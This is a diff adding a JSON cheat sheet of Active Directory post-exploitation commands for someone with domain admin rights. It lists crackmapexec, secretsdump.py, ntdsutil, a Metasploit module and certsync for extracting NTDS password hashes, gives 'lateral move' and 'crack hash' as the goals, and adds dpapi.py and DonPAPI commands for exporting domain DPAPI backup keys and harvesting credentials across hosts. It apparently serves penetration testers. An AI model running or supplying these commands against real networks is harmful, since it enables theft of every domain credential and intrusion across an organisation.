@@ -1,0 +1,64 @@
+{
+  "Domain_Admin_Actions": {
+    "NTDS_Extraction": {
+      "methods": [
+        {
+          "cme_method": {
+            "command": "cme smb <dcip> -u <user> -p <password> -d <domain> --ntds",
+            "type": "Direct extraction"
+          }
+        },
+        {
+          "secretsdump_method": {
+            "basic": "secretsdump.py '<domain>/<user>:<pass>@<ip>'",
+            "advanced": {
+              "command": "secretsdump.py -ntds ntds_file -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm -extract",
+              "description": "For offline extraction"
+            }
+          }
+        },
+        {
+          "ntdsutil_method": {
+            "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q",
+            "description": "Native Windows tool"
+          }
+        },
+        {
+          "windows_native": {
+            "command": "windows/gather/credentials/domain_hashdump",
+            "type": "Post-exploitation module"
+          }
+        },
+        {
+          "certsync_method": {
+            "command": "certsync -u <user> -p <password> -d <domain> -dc-ip <dcip> -ns <nsip>",
+            "type": "Certificate-based sync"
+          }
+        }
+      ],
+      "results": [
+        "Lateral move",
+        "Crack hash"
+      ]
+    },
+    "Backup_Key_Operations": {
+      "dpapi": {
+        "note": "dpapi.py != DonPAPI",
+        "methods": [
+          {
+            "backup_extraction": {
+              "command": "dpapi.py backupkeys -hashes '<hash>' -t 'Administrator@<dc_ip>' --export",
+              "description": "Extract backup keys"
+            }
+          },
+          {
+            "donpapi_method": {
+              "command": "DonPAPI -pvk <domain_backupkey.pvk> -h '<hash>' <domain>/<user>@<ip_range>",
+              "result": "Credentials"
+            }
+          }
+        ]
+      }
+    }
+  }
+}
